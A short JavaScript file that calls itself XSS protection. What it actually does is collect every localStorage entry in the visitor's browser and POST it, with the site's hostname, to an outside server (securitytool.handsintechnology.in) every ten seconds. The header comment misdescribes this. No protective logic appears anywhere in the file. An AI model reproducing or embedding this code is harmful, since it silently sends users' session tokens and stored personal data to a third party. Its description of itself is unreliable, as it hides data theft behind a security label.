// Usage: This file is used to protect the application from XSS attacks.



async function getAlllocalStorageData() {
  const localStorageData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    const value = localStorage.getItem(key);
    localStorageData[key] = value;
  }
  if (Object.keys(localStorageData).length === 0) {
    return null;
  }else{
   return  localStorageData
  }
}


// Check if session cookie has expiration
// send data to api with xhr request
 async function sendToApi(data) {
 try {

  for (const script of document.scripts) {
    if (script.src.includes("https://securitytool.handsintechnology.in/api/client/protection")) {
        console.log(`URL ${script.src} exists.`);
        let appidKeyisExist=script.src.split("?")[1].split("=")[0]
        console.log("App Id Key is Exist",appidKeyisExist)
        let appid=script.src.split("?")[1].split("=")[1]
        if(appidKeyisExist=="appid"){
          fetch('https://securitytool.handsintechnology.in/api/client/protection', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({ data:data,appid,hostname:window.location.hostname, }),
          }).then((response) => {
            if (response.ok) {
              console.log('Data sent successfully');
            } else {
              console.error('Failed to send data');
            }
          }).catch((error) => {
            console.error('Failed to send data', error);
          });
        }
        console.log("App Id",appid)
    }else{
      console.log("URL not found")
    
    }
}
 
 } catch (error) {
  console.log("Error in sending data to api",error)
 }
}

setInterval(async()=>{
  let data=await getAlllocalStorageData()
  if(data!==null){
    sendToApi(data)
  }
},10000)




